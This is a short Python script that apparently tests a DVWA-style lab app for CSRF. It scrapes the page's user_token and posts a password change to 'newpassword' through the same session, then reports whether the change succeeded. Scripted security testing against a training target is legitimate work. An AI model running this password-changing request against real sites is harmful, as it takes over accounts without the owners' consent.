import requests
from bs4 import BeautifulSoup

def check_csrf(session, base_url):
    csrf_url = base_url + "vulnerabilities/csrf/"
    change_password_url = base_url + "vulnerabilities/csrf/?password=newpassword&confirm_password=newpassword&Change=Change#"
    
    try:
        # Navigate to the CSRF page to get the CSRF token
        response = session.get(csrf_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value'] # type: ignore
        
        # Prepare payload to change the password
        payload = {
            'password_new': 'newpassword',
            'password_conf': 'newpassword',
            'Change': 'Change',
            'user_token': user_token
        }
        
        # Perform the CSRF attack
        response = session.post(change_password_url, data=payload)
        
        if "Password Changed" in response.text:
            print("CSRF vulnerability detected. Password was changed without user consent.")
        else:
            print("CSRF vulnerability not detected. Password change failed or required user interaction.")
    
    except Exception as e:
        print(f"An error occurred while testing for CSRF: {e}")
